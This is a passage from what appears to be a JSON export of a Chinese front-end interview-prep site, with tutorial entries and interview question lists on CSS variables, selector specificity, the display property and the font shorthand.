body:after {\n>   content: '--screen-category : 'var(--screen-category);\n> }\n> ```\n\n如果变量值是数值，不能与数值单位直接连用。\n\n> ```css\n> \n> .foo {\n>   --gap: 20;\n>   /* 无效 */\n>   margin-top: var(--gap)px;\n> }\n> ```\n\n上面代码中，数值与单位直接写在一起，这是无效的。必须使用`calc()`函数，将它们连接。\n\n> ```css\n> \n> .foo {\n>   --gap: 20;\n>   margin-top: calc(var(--gap) * 1px);\n> }\n> ```\n\n如果变量值带有单位，就不能写成字符串。\n\n> ```css\n> \n> /* 无效 */\n> .foo {\n>   --foo: '20px';\n>   font-size: var(--foo);\n> }\n> \n> /* 有效 */\n> .foo {\n>   --foo: 20px;\n>   font-size: var(--foo);\n> }\n> ```\n\n## 四、作用域\n\n同一个 CSS 变量，可以在多个选择器内声明。读取的时候，优先级最高的声明生效。这与 CSS 的\"层叠\"（cascade）规则是一致的。\n\n下面是一个例子\n> ```xml\n> \n> <style>\n>   :root { --color: blue; }\n>   div { --color: green; }\n>   #alert { --color: red; }\n>   * { color: var(--color); }\n> </style>\n> \n> <p>蓝色</p>\n> <div>绿色</div>\n> <div id=\"alert\">红色</div>\n> ```\n\n上面代码中，三个选择器都声明了`--color`变量。不同元素读取这个变量的时候，会采用优先级最高的规则，因此三段文字的颜色是不一样的。\n\n这就是说，变量的作用域就是它所在的选择器的有效范围。\n\n> ```css\n> \n> body {\n>   --foo: #7F583F;\n> }\n> \n> .content {\n>   --bar: #F7EFD2;\n> }\n> ```\n\n上面代码中，变量`--foo`的作用域是`body`选择器的生效范围，`--bar`的作用域是`.content`选择器的生效范围。\n\n由于这个原因，全局的变量通常放在根元素`:root`里面，确保任何选择器都可以读取它们。\n\n> ```css\n> \n> :root {\n>   --main-color: #06c;\n> }\n> ```\n\n## 五、响应式布局\n\nCSS 是动态的，页面的任何变化，都会导致采用的规则变化。\n\n利用这个特点，可以在响应式布局的`media`命令里面声明变量，使得不同的屏幕宽度有不同的变量值。\n\n> ```css\n> \n> body {\n>   --primary: #7F583F;\n>   --secondary: #F7EFD2;\n> }\n> \n> a {\n>   color: var(--primary);\n>   text-decoration-color: var(--secondary);\n> }\n> \n> @media screen and (min-width: 768px) {\n>   body {\n>     --primary:  #F7EFD2;\n>     --secondary: #7F583F;\n>   }\n> }\n> ```\n\n## 六、兼容性处理\n\n对于不支持 CSS 变量的浏览器，可以采用下面的写法。\n\n> ```css\n> \n> a {\n>   color: #7F583F;\n>   color: var(--primary);\n> }\n> ```\n\n也可以使用`@support`命令进行检测。\n\n> ```scss\n> \n> @supports ( (--a: 0)) {\n>   /* supported */\n> }\n> \n> @supports ( not (--a: 0)) {\n>   /* not supported */\n> }\n> ```\n\n## 七、JavaScript 操作\n\nJavaScript 也可以检测浏览器是否支持 CSS 变量。\n\n> ```sas\n> \n> const isSupported =\n>   window.CSS &&\n>   window.CSS.supports &&\n>   window.CSS.supports('--a', 0);\n> \n> if (isSupported) {\n>   /* supported */\n> } else {\n>   /* not supported */\n> }\n> ```\n\nJavaScript 操作 CSS 变量的写法如下。\n\n> ```awk\n> \n> // 设置变量\n> document.body.style.setProperty('--primary', '#7F583F');\n> \n> // 读取变量\n> document.body.style.getPropertyValue('--primary').trim();\n> // '#7F583F'\n> \n> // 删除变量\n> document.body.style.removeProperty('--primary');\n> ```\n\n这意味着，JavaScript 可以将任意值存入样式表。下面是一个监听事件的例子，事件信息被存入 CSS 变量。\n\n> ```reasonml\n> \n> const docStyle = document.documentElement.style;\n> \n> document.addEventListener('mousemove', (e) => {\n>   docStyle.setProperty('--mouse-x', e.clientX);\n>   docStyle.setProperty('--mouse-y', e.clientY);\n> });\n> ```\n\n那些对 CSS 无用的信息，也可以放入 CSS 变量。\n\n> ```css\n> \n> --foo: if(x > 5) this.width = 10;\n> ```\n\n上面代码中，`--foo`的值在 CSS 里面是无效语句，但是可以被 JavaScript 读取。这意味着，可以把样式设置写在 CSS 变量中，让 JavaScript 读取。\n\n所以，CSS 变量提供了 JavaScript 与 CSS 通信的一种途径。\n\n> 原文：www.ruanyifeng.com\n\n",
    "testPoint": "### 1. **CSS变量基础**\n   - 请简述什么是 CSS 变量？它如何工作？\n   - 如何声明和使用 CSS 变量？请提供一个简单的例子。\n     ```css\n     :root {\n       --main-color: #3498db;\n     }\n\n     body {\n       background-color: var(--main-color);\n     }\n     ```\n\n### 2. **作用域与继承**\n   - CSS 变量的作用域是什么？它是如何继承的？\n   - 在什么情况下，CSS 变量会被继承？如果你在一个父元素中定义了 CSS 变量，它会影响子元素吗？\n   - 如何使用 `:root` 来定义全局变量，或者在某个特定元素中定义局部变量？\n\n### 3. **动态修改与计算**\n   - CSS 变量是否可以动态修改？请举例说明如何使用 JavaScript 修改 CSS 变量的值。\n   - 请解释如何通过 `calc()` 函数与 CSS 变量结合使用，来进行动态计算。\n\n### 4. **CSS 变量与浏览器兼容性**\n   - 你如何处理不同浏览器对 CSS 变量的兼容性问题？哪些浏览器支持 CSS 变量？\n   - 如果需要兼容不支持 CSS 变量的浏览器，通常的解决方案是什么？\n\n### 5. **CSS变量与主题切换**\n   - 你如何使用 CSS 变量实现网站主题的切换（如明暗主题）？请提供一个实现的示例。\n   - 当切换主题时，如何通过 CSS 变量动态修改页面的颜色、字体或其他样式？\n\n### 6. **多级作用域与优先级**\n   - 如果在局部作用域内重新定义了一个变量，它会覆盖全局定义的变量吗？\n   - 请解释 CSS 变量在作用域中是如何工作的，局部变量如何覆盖全局变量？\n\n### 7. **支持的类型**\n   - CSS 变量的值可以是什么类型？可以是颜色、长度、百分比、关键字、URL 等吗？\n   - 你能给出一些使用 CSS 变量来控制颜色、间距、字体大小等样式的示例吗？\n\n### 8. **与常规 CSS 属性的结合**\n   - CSS 变量与其他常规 CSS 属性（如 `background-color`、`font-size`）结合时，有哪些常见的应用场景？\n   - 如何在一个元素的 `background` 或 `border` 样式中使用 CSS 变量来动态改变外观？\n\n### 9. **继承与局部作用域**\n   - CSS 变量是如何继承的？它们与其他属性（如 `color` 或 `font-size`）的继承机制有何不同？\n   - 如何在子元素中使用父元素定义的 CSS 变量？如果父元素未定义变量，子元素可以使用什么默认值？\n\n### 10. **性能优化**\n   - 使用 CSS 变量与常规 CSS 样式相比，是否有性能上的差异？如果有，如何优化性能？\n   - 在页面大量使用 CSS 变量时，如何避免性能瓶颈？例如，避免对复杂变量进行频繁的计算。\n\n### 11. **CSS 变量与 JavaScript 的交互**\n   - 如何在 JavaScript 中读取和修改 CSS 变量的值？请举例说明。\n   - 你如何通过 JavaScript 动态更改页面样式并改变 CSS 变量的值？\n\n### 12. **与预处理器（如 Sass）比较**\n   - 与 CSS 预处理器（如 Sass、LESS）中的变量相比，CSS 变量有什么优势和劣势？\n   - 当使用 CSS 变量时，如何确保样式在多个组件或页面间保持一致性？\n\n### 13. **使用场景**\n   - 请举例说明你在实际项目中如何使用 CSS 变量来优化样式管理，例如在大型项目中的主题系统或组件库中。\n   - 你如何通过 CSS 变量改善样式的可维护性和可重用性？\n\n### 14. **对计算和动画的支持**\n   - CSS 变量能否用于 CSS 动画中的动画属性？如何在动画过程中动态修改变量的值？\n   - 当我们在 CSS 动画中使用 CSS 变量时，动画的流畅性和表现会如何？\n\n### 15. **调试与可维护性**\n   - 在开发中，如何有效调试 CSS 变量的值，确保它们被正确使用和应用？\n   - 如果 CSS 变量的值出现错误，如何迅速定位和修复问题？",
    "exerciseKeyList": "[\"023bc117-e6d8-4099-a847-1143d97b2809\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 18,
    "createAt": "2024-10-10T06:25:58.000Z",
    "updateAt": "2024-11-18T01:54:24.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "023bc117-e6d8-4099-a847-1143d97b2809",
        "title": "说说你对 CSS 变量的了解",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-11-08T15:02:33.000Z",
        "updateAt": "2024-11-08T15:02:40.000Z"
      }
    ]
  },
  "122": {
    "id": 122,
    "tagId": 11,
    "title": "优先级",
    "explanation": "在前端面试中，经常会遇到CSS选择器的问题三连：\n\n1. 说一下CSS的选择器有哪些\n2. 优先级是怎样的\n3. 权重计算方式\n\n今天就来给大家介绍选择器的优先级和权重计算方式。\n\n## 优先级是什么？有什么用？\n\n先提出一个问题：如果一个元素通过多种方式设置了字体大小，那么浏览器在最后渲染时会使用哪个属性值呢？\n\n其实，浏览器会通过优先级来判断哪些属性值与一个元素最为相关，从而在该元素上应用这些属性值。优先级是基于不同种类选择器组成的匹配规则。\n\n换种说法，优先级就是分配给指定的 CSS 声明的一个权重，它由 **匹配的选择器** 中的 **每一种选择器类型的数值** 决定。\n\n总结一下：\n* 权重决定了你css规则怎样被浏览器解析直到生效，css权重关系到你的css规则是怎样显示的。\n* 当很多的样式被应用到某一个元素上时，权重决定哪种样式生效。\n* 每个选择器都有自己的权重。你的每条css规则，都包含一个权重级别。 这个级别是由不同的选择器加权计算的，通过权重，不同的样式最终会作用到你的网页中 。\n* 如果两个选择器同时作用到一个元素上，权重高者生效。\n\n## 权重的计算规则\n\n接着介绍权重的计算规则：\n\n* 第一优先级：`!important`会覆盖页面内任何位置的元素样式\n* 内联样式，如`style=\"color: green\"`，权值为**1000**\n* ID选择器，如`#app`，权值为**0100**\n* 类、伪类、属性选择器，如`.foo`, `:first-child`, `div[class=\"foo\"]`，权值为**0010**\n* 标签、伪元素选择器，如`div::first-line`，权值为**0001**\n* 通配符、子类选择器、兄弟选择器，如`*, >, +`，权值为**0000**\n* 继承的样式没有权值\n\n权值计算公式：\n\n> `权值` = `第一等级选择器` x `个数`，`第二等级选择器` x `个数`，`第三等级选择器` x `个数`，`第四等级选择器` x `个数`\n\n比如：\n\n|选择器|千位|百位|十位|个位|优先级|\n|--|--|--|--|--|--|\n|h1\t|0|\t0|\t0|\t1|\t0001|\n|h1 + p::first-letter|\t0|\t0|\t0\t|3|\t0003|\n|li > a[href*=\"en-US\"] > .inline-warning\t|0|\t0\t|2\t|2\t|0022|\n|#identifier|\t0\t|1|\t0\t|0|\t0100|\n|内联样式|\t1|\t0|\t0|\t0\t|1000|\n\n## 权重的比较规则\n\n当两个权值进行比较的时候，是从高到低逐级将等级位上的权重值（如 权值 1,0,0,0 对应--> 第一等级权重值，第二等级权重值，第三等级权重值，第四等级权重值）来进行比较的，而不是简单的 1000个数 + 100个数 + 10个数 + 1个数 的总和来进行比较的，换句话说，低等级的选择器，个数再多也不会越等级超过高等级的选择器的优先级的。\n\n下面通过几个例子进行比较规则的说明。\n\n### 示例一\n\n假设下面样式都作用于同一个节点元素`span`，判断下面哪个样式会生效\n\n```css\nbody#god div.dad span.son {width: 200px;}\nbody#god span#test {width: 250px;}\n```\n\n比较规则说明：\n\n* 先比较高权重位，即第一个样式的高权重为 `#god` = 100\n* 第二个样式的高权重为 `#god` + `#text` = 200\n* 100 < 200\n* 所以最终计算结果是取 `width: 250px;`\n* 若两个样式的高权重数量一样的话，则需要比较下一较高权重！\n\n### 示例二\n\n```html\n<style type=\"text/css\">\n     #parent p { background-color: red;  }\n      div .a.b.c.d.e.f.g.h.i.j.k p{ background-color: green;  \n</style>\n......\n<div id=\"parent\">\n     <div class=\"a b c d e f g h i j k\">\n         <p>xxxx</p>\n     </div>\n</div>\n\n```\n\n如果按照相加的错误方法，如果按照相加的规则的话，上述例子会为：\n\n```\n  qz1 = 100 + 1 = 101\n  qz2 = 1 + 10*11 + 1 = 112\n  qz1 < qz2\n```\n这样得出结论：第二条样式优先级高，背景色为 `green`。\n\n但结果却是 `red`，这也证明了权重是按优先级进行比较的。\n\n总结下比较规则：\n\n* 1000 > 0100，从左向右逐个比较，前一级相等才能往后比较\n* 无论是行内样式、内部样式还是外部样式，都是按照以上提到的权重方式进行比较。面试的时候遇到优先级比较，如果答案是：`行内>id>class>元素(标签)`，我们以为给了能令面试官满意的答案，其实不然，比如对同一个元素操作，在权重相等的情况下，后面的样式会覆盖前面的，这样我们给出来的答案就不成立了\n* 权重相同的情况下，位于后面的样式会覆盖前面的样式\n* 通配符、子选择器、兄弟选择器，虽然权重为0000，但是优先于继承的样式\n\n## !important 例外规则\n\n当在一个样式声明中使用一个 `!important` 规则时，此声明将覆盖任何其他声明。\n\n虽然，从技术上讲，`!important` 与优先级无关，但它与最终的结果直接相关。\n\n**使用 !important 是一个坏习惯，应该尽量避免**，因为这破坏了样式表中的固有的级联规则，使得调试找bug变得更加困难了。\n\n当两条相互冲突的带有 `!important` 规则的声明被应用到相同的元素上时，拥有更大优先级的声明将会被采用。\n\n一些经验法则：\n\n* 一定要优先考虑使用样式规则的优先级来解决问题而不是 !important\n* 只有在需要覆盖全站或外部 CSS 的特定页面中使用 !important\n* 永远不要在你的插件中使用 !important\n* 永远不要在全站范围的 CSS 代码中使用 !important\n\n最后，我们再来看个例子：\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Document</title>\n    <style>\n        * {\n            padding: 0;\n            margin: 0;\n            font-size: 24px;\n        }\n        .main {\n            position: absolute;\n            top: 50%;\n            left: 50%;\n            transform: translate(-50%, -50%);\n        }\n        p {color: yellowgreen} /* 0,0,0,1 */\n        .para {color: red} /* 0,0,1,0 */\n        .inner p {color: pink} /* 0,0,1,1 */\n        .main p[class*=\"para\"] {color: rgb(0, 255, 115)} /* 0,0,2,0 */ /*权重相同，后者覆盖前者*/\n        .main p[class=\"para1\"] {color:teal} /* 0,0,2,0 */\n        div.main p[class=\"para2\"]{color: blueviolet;} /* 0,0,2,1 */\n        .inner p:nth-child(4) {color: cornflowerblue !important;} /*0,0,2,0, !important提升优先级*/\n    </style>\n</head>\n<body>\n    <div class=\"main\">\n        <div id=\"app\" class=\"inner\" >\n            <p style=\"color: red;\">我是红色的，内联样式生效</p>\n            <p class=\"para1\">离离原上草，</p>\n            <p class=\"para2\">一岁一枯荣。</p>\n            <p class=\"para3\">野火烧不尽，</p>\n            <p class=\"para4\">春风吹又生。</p>\n        </div>\n    </div>\n</body>\n</html>\n```\n\n样式呈现的效果如下：\n\n![](https://static.ecool.fun//article/fa8ae301-e639-4982-b6db-c1b254112904.image)\n\n\n",
    "testPoint": "### 1. **CSS 层叠**\n   - 请解释什么是 **CSS 层叠**（Cascading）。它是如何影响样式的应用的？\n   - 当多个 CSS 规则作用于同一元素时，CSS 如何决定哪个规则生效？请简述层叠的过程。\n   - 在 CSS 层叠中，出现冲突时，样式的优先级是如何确定的？CSS 层叠规则的顺序是什么？\n\n### 2. **CSS 优先级**\n   - CSS 的优先级（Specificity）是什么？如何计算优先级？\n   - 请列举并解释以下选择器的优先级从高到低的顺序：\n     - 元素选择器（例如 `div`）\n     - 类选择器（例如 `.class-name`）\n     - ID 选择器（例如 `#id-name`）\n     - 内联样式（如 `style=\"...\"`）\n     - 通配符选择器（如 `*`）\n   - 如果出现多个选择器优先级相同的情况，CSS 是如何决定哪个规则生效的？例如，两个类选择器作用于同一个元素。\n\n### 3. **选择器优先级计算**\n   - 解释如何计算选择器的优先级，例如：`div.class1` 和 `#id1 .class2` 哪个优先级更高？\n   - 你如何通过调试工具查看一个元素的最终样式？如何知道哪些规则生效？\n   - 请给出几个例子，展示不同选择器组合的优先级如何影响最终应用的样式。\n\n### 4. **内联样式和外部样式的优先级**\n   - 内联样式的优先级高于外部样式表的规则，为什么？能否通过 `!important` 来覆盖内联样式？\n   - 当存在内联样式与外部样式表规则冲突时，哪一方的样式会生效？\n   - 你如何避免过度使用内联样式以提高代码的可维护性？\n\n### 5. **`!important`**\n   - `!important` 在 CSS 中是做什么用的？它如何影响样式的优先级？\n   - 使用 `!important` 时要小心哪些问题？过度使用 `!important` 会带来哪些潜在问题？\n   - 如何排查 CSS 中 `!important` 导致的样式冲突？\n\n### 6. **CSS 继承**\n   - 请解释什么是 **CSS 继承**。哪些 CSS 属性是可以继承的，哪些不能继承？\n   - 请举例说明常见的继承属性，例如 `color`、`font-family` 和 `line-height`。\n   - CSS 继承是如何工作的？子元素是否会自动继承父元素的样式？\n   - 如果需要防止某些属性继承到子元素，你该如何做？\n     - 比如，如何防止 `font-family` 在子元素中继承？\n\n### 7. **`inherit`、`initial` 和 `unset`**\n   - `inherit`、`initial` 和 `unset` 这三个关键字有什么区别？它们在继承和样式初始化中分别有什么作用？\n   - 你如何使用 `inherit` 来强制一个元素继承某个样式？\n   - `initial` 和 `unset` 在特定情况下的行为是怎样的？它们与默认值有何不同？\n\n### 8. **层叠顺序与 CSS 规则**\n   - 如果多个选择器的优先级相同，CSS 如何决定哪个规则应用？请解释层叠的顺序。\n   - CSS 层叠顺序的规则包括样式表的位置、选择器的优先级等，如何理解这些规则？\n   - 当在样式表中多次定义相同的规则时，最后一条规则会覆盖前面的规则吗？\n\n### 9. **样式表的来源**\n   - 请列举并解释以下样式表的来源以及它们在层叠和优先级中的影响：\n     - 浏览器的默认样式表（user agent stylesheets）\n     - 外部样式表\n     - 内联样式\n     - 嵌入式样式（`<style>` 标签）\n   - 如何利用浏览器的开发者工具查看每个样式来源？\n\n### 10. **继承与性能**\n   - 继承样式在性能上有何影响？继承的样式是否会增加浏览器渲染的负担？\n   - 你如何优化具有复杂继承关系的页面样式，以提高性能？\n\n### 11. **实际应用**\n   - 请描述一个实际开发中的场景，如何根据层叠和优先级解决样式冲突问题？\n   - 如果多个 CSS 文件中的样式有冲突，你如何调试和解决这些问题？在多人协作开发时，如何确保 CSS 样式的可维护性？\n\n### 12. **层叠与模块化开发**\n   - 在模块化开发中（如使用 CSS 模块、SCSS 或 BEM 等方法），如何处理 CSS 层叠问题？\n   - 你如何确保不同模块间的样式不会相互影响？有哪些方法可以隔离 CSS 样式？\n\n### 13. **层叠顺序与组件库**\n   - 在使用第三方组件库时，如果该库的样式与项目中的样式发生冲突，你如何通过调整优先级或其他方式解决这些冲突？\n   - 你如何使用 CSS 变量、`!important` 或 CSS 重置来管理大型项目中的样式冲突？\n\n### 14. **浏览器的默认样式**\n   - 每个浏览器都有自己的默认样式表（user agent stylesheet）。它对页面样式的影响是什么？\n   - 如何通过 CSS 重置或标准化（如使用 `normalize.css`）来解决不同浏览器间的样式差异？",
    "exerciseKeyList": "[\"bbbb61f4-a591-46db-ae66-7884bb682099\",\"376fe4ce-b43c-45b3-834b-28da33c56920\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 3,
    "createAt": "2024-10-10T06:31:42.000Z",
    "updateAt": "2024-11-10T05:41:07.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "376fe4ce-b43c-45b3-834b-28da33c56920",
        "title": "css选择器有哪些？优先级分别是什么？哪些属性可以继承？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-03T09:40:10.000Z",
        "updateAt": "2024-07-22T10:02:41.000Z"
      },
      {
        "exerciseKey": "bbbb61f4-a591-46db-ae66-7884bb682099",
        "title": "html 元素节点上， 有多个 class 名称，这几个class 名称对应的样式渲染优先级是如何的？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:26.000Z",
        "updateAt": "2024-09-10T10:56:24.000Z"
      }
    ]
  },
  "123": {
    "id": 123,
    "tagId": 11,
    "title": "display",
    "explanation": "#### 一、display属性介绍\n\ndisplay 属性规定元素应该生成的框的类型。\n\n以下是一些关于display比较常用的属性值：\n\n| 值 | 描述 |\n| --- | --- |\n| none | 元素不会显示 |\n| block | 此元素将显示为块级元素，此元素前后会带有换行符。 |\n| inline | 默认。此元素会被显示为内联元素，元素前后没有换行符。 |\n| line-block | 行内块元素。（CSS2.1 新增的值）\\[IE6/7不支持\\] |\n| list-item | 此元素会作为列表显示。 |\n| inline-table | 此元素会作为内联表格来显示（类似 table），表格前后没有换行符。 |\n| table | 此元素会作为块级表格来显示（类似 table），表格前后带有换行符。 |\n| table-row | 此元素会作为一个表格行显示（类似 tr）。 |\n| table-cell | 此元素会作为一个表格单元格显示（类似 td 和 th）. |\n| inherit | 规定应该从父元素继承 display 属性的值。 |\n\n其中我们在前端开发中比较常用的属性值一般是none、block、inline、inline-block。我将按顺序为这些属性值一一讲解。\n\n#### 二、display:none\n\n1.  将元素与其子元素从普通文档流中移除。这时文档的渲染就像元素从来没有存在过一样，也就是说它所占据的空间消失了。元素的内容也会消失。\n\n#### 三、display:block\n\n1.  block元素会独占一行，多个block元素会各自新起一行。默认情况下，block元素宽度自动填满其父元素宽度；\n2.  block元素可以设置margin和padding属性；\n3.  block元素可以设置width、height属性。\n4.  块级元素即使设置了宽度，仍然是独占一行。块级元素在设置宽度的情况下，是通过自定义margin-right来自动填满一行，这个时候你设置margin-right是无效的；块级元素在没有设置宽度的时候，margin-right会生效，块级元素的width通过自定义在自动填满一行。\n\n块级元素在设置宽度的情况下，是通过自定义margin-right来自动填满一行，这个时候你设置margin-right是无效的，如下图所示：\n\n![在这里插入图片描述](https://static.ecool.fun//article/57a7eb84-7064-4638-9b62-1c96b2b60302.png)\n\n* * *\n\n块级元素在没有设置宽度的时候，margin-right会生效，块级元素的width通过自定义在自动填满一行，如下图所示：\n\n![在这里插入图片描述](https://static.ecool.fun//article/038ba449-72c4-4af3-b2cc-0a7a2d1b6b9a.png)\n\n* * *\n\n#### 四、display:inline\n\n1.  inline元素不会独占一行，多个相邻的行内元素会排列在同一行里，直到一行排列不下，才会新换一行，其宽度随元素的内容而变化；\n2.  inline元素设置width、height属性无效；\n3.  inline元素的margin和padding属性，水平方向的padding-left、padding-right、margin-left、margin-right都产生边距效果；但竖直方向的padding-top、padding-bottom、margin-top、margin-bottom不会产生边距效果。\n\n如下图所示：\n\n![在这里插入图片描述](https://static.ecool.fun//article/5a8285b2-0b6a-4cfb-b1e4-349acda6b580.png)\n\n* * *\n\n#### 五、display:inline-block\n\n1.  将对象呈现为inline对象，但是对象的内容作为block对象呈现，之后的内联对象会被排列在同一行内。就是集合了block和inline的全部优点。width、height、margin、padding设置都会生效。\n\n如下图所示：\n\n![在这里插入图片描述](https://static.ecool.fun//article/9a9f5971-d855-4c53-be6f-43f4d9587d53.png)\n\n* * *\n\n> 原文：https://juejin.cn/post/6844903781566513160",
    "testPoint": "### 1. **基本概念**\n   - 请简述 CSS 中的 **`display`** 属性及其作用。\n   - **`display`** 属性的常见值有哪些？请列举并解释其含义。\n     - 例如：`block`、`inline`、`inline-block`、`flex`、`grid`、`none` 等。\n\n### 2. **`display: block`**\n   - 什么是 **`display: block`**？它会给元素带来哪些表现？\n   - 一个块级元素通常具有哪些特点？例如：它的宽度会如何变化？它是否会换行？\n\n### 3. **`display: inline`**\n   - 什么是 **`display: inline`**？它与 **`display: block`** 有什么不同？\n   - 内联元素如何处理宽度和高度？它们是否会占据整个可用宽度？\n   - 如何让一个内联元素变得像块级元素一样换行？\n\n### 4. **`display: inline-block`**\n   - 什么是 **`display: inline-block`**？它结合了 `inline` 和 `block` 的哪些特点？\n   - 使用 **`inline-block`** 时，元素的宽高如何影响布局？\n   - `inline-block` 元素如何与其他元素对齐？\n\n### 5. **`display: none`**\n   - 请解释 **`display: none`** 的作用与 **`visibility: hidden`** 的区别。\n   - 使用 **`display: none`** 会有什么样的表现？例如，它对页面布局有何影响？\n   - 当你将一个元素的 **`display`** 设置为 **`none`** 时，它会消失，但仍然存在于 DOM 中。如何通过 JavaScript 使其重新显示？\n\n### 6. **`display: flex`**\n   - **`display: flex`** 是什么？它通常用来实现什么样的布局效果？\n   - 在使用 `flex` 布局时，如何控制子元素的排列方向、对齐方式等？\n   - **`justify-content`**、**`align-items`**、**`flex-direction`** 等 Flexbox 属性的作用是什么？\n\n### 7. **`display: grid`**\n   - 什么是 **`display: grid`** 布局？它与 **`flex`** 布局有何区别？\n   - 在 **`grid`** 布局中，如何设置行和列的大小？如何控制子元素的位置？\n   - 请举例说明 **`grid-template-columns`**、**`grid-template-rows`**、**`grid-gap`** 等属性的使用方法。\n\n### 8. **`display: table`**\n   - 什么是 **`display: table`**，它如何模仿传统的 HTML `<table>` 元素？\n   - 使用 **`display: table`** 时，如何控制表格的行和列布局？\n   - **`display: table-row`**、**`display: table-cell`** 和 **`display: table-caption`** 的作用是什么？\n\n### 9. **布局模型对比：`block` vs `inline` vs `flex` vs `grid`**\n   - 你如何选择使用 **`block`**、**`inline`**、**`flex`** 或 **`grid`** 布局？\n   - 在实际项目中，什么时候使用 `flex` 布局，什么时候使用 `grid` 布局？\n   - 请比较 `flex` 和 `grid` 布局的优缺点及应用场景。\n\n### 10. **`display` 与其他布局属性**\n   - 在使用 **`display: flex`** 或 **`display: grid`** 布局时，如何与其他布局属性（如 `position`、`float` 等）配合使用？\n   - 如何解决使用 **`display: flex`** 或 **`display: grid`** 布局时遇到的常见布局问题，例如元素溢出、对齐等？\n\n### 11. **`display: none` 与性能**\n   - **`display: none`** 对页面性能有何影响？如何通过 JavaScript 动态控制显示/隐藏元素以提高性能？\n\n### 12. **`display: contents`**\n   - 什么是 **`display: contents`**？它是如何工作的？它与其他 **`display`** 值有什么区别？\n   - 请举例说明 **`display: contents`** 的应用场景及可能的问题。\n\n### 13. **`display` 的继承性**\n   - **`display`** 属性是否继承？如果没有，如何通过样式继承的方式控制多个元素的 **`display`** 属性？\n   - 你如何在多个嵌套元素中保持一致的布局设置？\n\n### 14. **`display` 的可见性与布局**\n   - `display` 属性会影响元素的布局、渲染和可见性。请简要解释 **`display: none`** 和 **`visibility: hidden`** 的区别，它们对页面的影响不同吗？\n\n### 15. **实际应用**\n   - 请描述一个你在实际开发中使用 **`display`** 属性解决布局问题的案例。\n   - 如果需要在一个响应式设计中调整元素的布局，如何根据屏幕尺寸调整 `display` 属性？",
    "exerciseKeyList": "[\"5f8efe01-0851-4c6f-87bc-f50d6e3ca279\",\"88d1350b-5dce-48f8-974d-9115b0d270d0\",\"b61122b0-5971-4bc9-afc2-4987d4aa06d7\",\"4c911fbf-c243-476a-ad8d-09a7868b304e\"]",
    "vipLimit": 0,
    "level": 2,
    "pointOrder": 19,
    "createAt": "2024-10-10T07:30:13.000Z",
    "updateAt": "2024-11-18T01:54:24.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "4c911fbf-c243-476a-ad8d-09a7868b304e",
        "title": "分析比较 opacity: 0、visibility: hidden、display: none 优劣和适用场景",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-19T14:33:34.000Z",
        "updateAt": "2024-07-22T09:22:51.000Z"
      },
      {
        "exerciseKey": "5f8efe01-0851-4c6f-87bc-f50d6e3ca279",
        "title": "相邻的两个inline-block节点为什么会出现间隔，该如何解决？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-02-15T15:00:58.000Z",
        "updateAt": "2024-08-10T17:06:11.000Z"
      },
      {
        "exerciseKey": "88d1350b-5dce-48f8-974d-9115b0d270d0",
        "title": "display 有哪些取值？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-02-15T14:17:19.000Z",
        "updateAt": "2025-04-07T07:55:34.000Z"
      },
      {
        "exerciseKey": "b61122b0-5971-4bc9-afc2-4987d4aa06d7",
        "title": "display:none与visibility:hidden 有什么区别？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-09-25T01:35:18.000Z",
        "updateAt": "2024-07-19T16:01:22.000Z"
      }
    ]
  },
  "124": {
    "id": 124,
    "tagId": 11,
    "title": "font",
    "explanation": "## 什么是 font 属性？\n\n在CSS中， `font` 属性是一个简写属性，用于设置字体的多个相关属性，包括字体大小、字体样式、字体粗细、字体系列等。使用 `font` 属性可以方便地在一个声明中设置多个字体相关的样式。\n\n## font 属性的语法\n\n```css\nfont: [font-style] [font-variant] [font-weight] [font-size] [line-height] [font-family];\n```\n\n## 各个属性的详细说明\n\n1. **font-style**：设置字体的样式。\n   - 取值：\n     - `normal`：正常字体（默认值）。\n     - `italic`：斜体字。\n     - `oblique`：倾斜字体。\n\n2. **font-variant**：设置字体的变体。\n   - 取值：\n     - `normal`：正常（默认值）。\n     - `small-caps`：小型大写字母。\n\n3. **font-weight**：设置字体的粗细。\n   - 取值：\n     - `normal`：正常粗细（默认值）。\n     - `bold`：加粗。\n     - `bolder`：比父元素更粗。\n     - `lighter`：比父元素更细。\n     - 数值：可以使用 100 到 900 的数值，100 为最细，900 为最粗。\n\n4. **font-size**：设置字体的大小。\n   - 取值：\n     - 可以使用绝对单位（如 `px`、 `pt`）或相对单位（如 `em`、 `rem`、 `%`）。\n\n5. **line-height**：设置行高。\n   - 取值：\n     - 可以使用数值、单位（如 `px`、 `em`）或百分比。\n\n6. **font-family**：设置字体系列。\n   - 取值：\n     - 可以指定多个字体名称，以逗号分隔，浏览器将使用第一个可用的字体。\n     - 例如： `\"Arial\", \"Helvetica\", sans-serif`。\n\n## 使用 font 属性的注意事项\n\n- `font` 属性必须按照特定的顺序书写，尤其是 `font-size` 和 `font-family`，它们是必需的。\n- 如果使用 `font` 属性，其他相关的字体属性（如 `font-size` 和 `font-family`）不能单独设置。\n\n## 实例：使用 font 属性设置文本样式\n\n### HTML 代码\n\n```html\n<!DOCTYPE html>\n<html lang=\"zh\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Font 属性示例</title>\n    <link rel=\"stylesheet\" href=\"styles.css\">\n</head>\n<body>\n    <h1 class=\"title\">欢迎来到我的网站</h1>\n    <p class=\"description\">这是一个关于CSS字体属性的示例，展示如何使用font属性设置文本样式。</p>\n</body>\n</html>\n```\n\n### CSS 代码（styles.css）\n\n```css\nbody {\n    font-family: Arial, sans-serif; /* 设置全局字体 */\n}\n\n.title {\n    font: bold 24px/1.5 \"Helvetica Neue\", Arial, 